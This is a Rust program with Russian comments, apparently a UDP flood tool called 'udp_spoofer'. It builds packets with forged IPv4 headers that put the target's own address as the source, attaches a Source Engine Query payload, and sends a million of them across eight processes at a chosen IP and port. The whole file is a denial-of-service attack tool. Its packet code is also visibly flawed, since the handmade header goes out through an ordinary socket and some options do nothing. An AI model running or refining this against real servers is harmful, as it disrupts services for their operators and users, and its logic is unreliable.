use std::{
    io,
    net::{IpAddr, Ipv4Addr, SocketAddr},
    process::{self, Command},
    sync::{Arc, Mutex},
    time::{Instant, SystemTime, UNIX_EPOCH},
};

#[cfg(unix)]
use std::os::fd::AsRawFd;

use clap::Parser;
use rand::Rng;
use socket2::{Domain, Protocol, Socket, Type};

const QUERY_PACKET: &[u8] = b"\xff\xff\xff\xff\x54Source Engine Query\x00";
const UDP_LENGTH: u16 = 8 + QUERY_PACKET.len() as u16;

#[derive(Parser, Debug)]
#[command(name = "udp_spoofer")]
struct Args {
    /// IP-адрес цели
    target_ip: String,

    /// Порт цели
    target_port: u16,

    /// Общее количество пакетов (по умолчанию 1 млн)
    #[arg(short, long, default_value_t = 1000000)]
    count: u32,

    /// Логировать каждый N-ный пакет (вывод только для процесса 0)
    #[arg(long, default_value_t = 10000)]
    log_every: u32,

    /// Сохранить первые N пакетов для диагностики (только процесс 0)
    #[arg(long, default_value_t = 5)]
    debug_packets: u32,

    /// Количество процессов для отправки пакетов (по умолчанию 8)
    #[arg(long, default_value_t = 8)]
    processes: u32,

    /// ID процесса (используется внутренне)
    #[arg(long)]
    process_id: Option<u32>,
}

fn checksum(data: &[u8]) -> u16 {
    let mut sum = 0u32;
    let mut data = data;
    
    // Если длина нечетная, добавляем нулевой байт
    let mut last_byte = None;
    if data.len() % 2 == 1 {
        last_byte = Some(data[data.len() - 1]);
        data = &data[..data.len() - 1];
    }

    // Обрабатываем данные по 2 байта
    for chunk in data.chunks(2) {
        sum += ((chunk[0] as u32) << 8 | chunk[1] as u32) as u32;
    }

    // Добавляем последний байт, если длина была нечетной
    if let Some(byte) = last_byte {
        sum += (byte as u32) << 8;
    }

    // Складываем старшие и младшие биты
    while sum >> 16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    !sum as u16
}

fn get_source_ip() -> io::Result<Ipv4Addr> {
    let socket = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
    socket.bind(&"0.0.0.0:0".parse::<SocketAddr>().unwrap().into())?;
    socket.connect(&"8.8.8.8:53".parse::<SocketAddr>().unwrap().into())?;
    
    if let SocketAddr::V4(addr) = socket.local_addr()?.as_socket().unwrap() {
        Ok(*addr.ip())
    } else {
        Err(io::Error::new(io::ErrorKind::Other, "Not an IPv4 address"))
    }
}

fn create_packet(
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    target_port: u16,
) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let src_port: u16 = rng.gen_range(1024..65535);
    let ip_id = rng.gen::<u16>();

    // IP заголовок (20 байт)
    let mut ip_header = vec![
        0x45, 0x00, // Version, IHL, DSCP, ECN
        0x00, 0x00, // Total Length
        0x00, 0x00, // Identification
        0x40, 0x00, // Flags, Fragment Offset
        0x40, 0x11, // TTL, Protocol
        0x00, 0x00, // Header Checksum
        0x00, 0x00, 0x00, 0x00, // Source IP
        0x00, 0x00, 0x00, 0x00, // Destination IP
    ];

    let total_length = 20 + UDP_LENGTH;
    ip_header[2..4].copy_from_slice(&total_length.to_be_bytes());
    ip_header[4..6].copy_from_slice(&ip_id.to_be_bytes());
    ip_header[12..16].copy_from_slice(&src_ip.octets());
    ip_header[16..20].copy_from_slice(&dst_ip.octets());

    let ip_checksum = checksum(&ip_header);
    ip_header[10..12].copy_from_slice(&ip_checksum.to_be_bytes());

    // UDP заголовок (8 байт)
    let mut udp_header = vec![
        0x00, 0x00, // Source Port
        0x00, 0x00, // Destination Port
        0x00, 0x00, // Length
        0x00, 0x00, // Checksum
    ];

    udp_header[0..2].copy_from_slice(&src_port.to_be_bytes());
    udp_header[2..4].copy_from_slice(&target_port.to_be_bytes());
    udp_header[4..6].copy_from_slice(&UDP_LENGTH.to_be_bytes());

    // Псевдозаголовок для UDP чексуммы
    let mut pseudo_header = Vec::new();
    pseudo_header.extend_from_slice(&src_ip.octets());
    pseudo_header.extend_from_slice(&dst_ip.octets());
    pseudo_header.push(0);
    pseudo_header.push(17); // UDP protocol
    pseudo_header.extend_from_slice(&UDP_LENGTH.to_be_bytes());
    pseudo_header.extend_from_slice(&udp_header);
    pseudo_header.extend_from_slice(QUERY_PACKET);

    let udp_checksum = checksum(&pseudo_header);
    udp_header[6..8].copy_from_slice(&udp_checksum.to_be_bytes());

    // Собираем финальный пакет
    let mut packet = Vec::new();
    packet.extend_from_slice(&ip_header);
    packet.extend_from_slice(&udp_header);
    packet.extend_from_slice(QUERY_PACKET);
    packet
}

fn create_socket() -> io::Result<Socket> {
    let socket = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
    
    #[cfg(unix)]
    {
        use std::os::unix::io::AsRawFd;
        socket.set_nonblocking(true)?;
    }
    
    #[cfg(windows)]
    {
        socket.set_nonblocking(true)?;
    }
    
    Ok(socket)
}

fn send_packets_thread(
    tid: u32,
    target_ip: Ipv4Addr,
    target_port: u16,
    packet_count: u32,
    log_every: u32,
    debug_packets: u32,
    total_sent: Arc<Mutex<u32>>,
) -> io::Result<()> {
    let socket = create_socket()?;
    let target = SocketAddr::new(IpAddr::V4(target_ip), target_port);
    
    let mut rng = rand::thread_rng();
    let mut packets_sent = 0;
    let start_time = Instant::now();
    let mut last_log = 0;
    
    while packets_sent < packet_count {
        let packet = create_packet(target_ip, target_ip, target_port);
        match socket.send_to(&packet, &target.into()) {
            Ok(_) => {
                packets_sent += 1;
                if packets_sent % log_every == 0 {
                    let elapsed = start_time.elapsed().as_secs_f64();
                    let pps = packets_sent as f64 / elapsed;
                    println!("[INFO] {} [Поток {}] - Отправлено {} пакетов, {:.2} PPS", 
                        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
                        tid,
                        packets_sent,
                        pps
                    );
                    last_log = packets_sent;
                }
            }
            Err(e) => {
                if e.kind() != io::ErrorKind::WouldBlock {
                    return Err(e);
                }
            }
        }
    }
    
    if packets_sent > last_log {
        let elapsed = start_time.elapsed().as_secs_f64();
        let pps = packets_sent as f64 / elapsed;
        println!("[INFO] {} [Поток {}] - Отправлено {} пакетов, {:.2} PPS",
            SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
            tid,
            packets_sent,
            pps
        );
    }
    
    *total_sent.lock().unwrap() += packets_sent;
    Ok(())
}

fn main() -> io::Result<()> {
    let args = Args::parse();
    
    if args.process_id.is_none() {
        let start_time = Instant::now();
        println!("\n[INFO] Запуск {} процессов", args.processes);
        println!("[INFO] Целевой IP: {}", args.target_ip);
        println!("[INFO] Целевой порт: {}", args.target_port);
        println!("[INFO] Всего пакетов: {}", args.count);
        println!("[INFO] Пакетов на процесс: {}\n", args.count / args.processes);

        let executable = std::env::current_exe()?;
        let packets_per_process = args.count / args.processes;
        let mut children = vec![];
        
        for pid in 0..args.processes {
            let packets = if pid == args.processes - 1 {
                packets_per_process + (args.count % args.processes)
            } else {
                packets_per_process
            };

            let child = Command::new(&executable)
                .arg(&args.target_ip)
                .arg(args.target_port.to_string())
                .arg("--count")
                .arg(packets.to_string())
                .arg("--processes")
                .arg("1")
                .arg("--log-every")
                .arg(args.log_every.to_string())
                .arg("--debug-packets")
                .arg(args.debug_packets.to_string())
                .arg("--process-id")
                .arg(pid.to_string())
                .spawn()?;
                
            children.push(child);
        }

        for mut child in children {
            child.wait()?;
        }

        let elapsed = start_time.elapsed().as_secs_f64();
        let total_packets = args.count;
        let total_pps = total_packets as f64 / elapsed;
        let total_mbps = (total_packets as f64 * 53.0 * 8.0) / (1024.0 * 1024.0 * elapsed);

        println!("\n[ИТОГОВАЯ СТАТИСТИКА]");
        println!("Время выполнения: {:.2} сек", elapsed);
        println!("Всего отправлено пакетов: {}", total_packets);
        println!("Средняя скорость: {:.2} PPS", total_pps);
        println!("Средняя нагрузка: {:.2} Mbps", total_mbps);
        println!("Процессов использовано: {}", args.processes);
        println!("PPS на процесс: {:.2}", total_pps / args.processes as f64);

        return Ok(());
    }

    let target_ip = args.target_ip.parse::<Ipv4Addr>()
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
    
    let total_sent = Arc::new(Mutex::new(0));
    
    if let Err(e) = send_packets_thread(
        args.process_id.unwrap(),
        target_ip,
        args.target_port,
        args.count,
        args.log_every,
        args.debug_packets,
        total_sent.clone()
    ) {
        eprintln!("Ошибка в процессе {}: {}", args.process_id.unwrap(), e);
    }

    Ok(())
} 
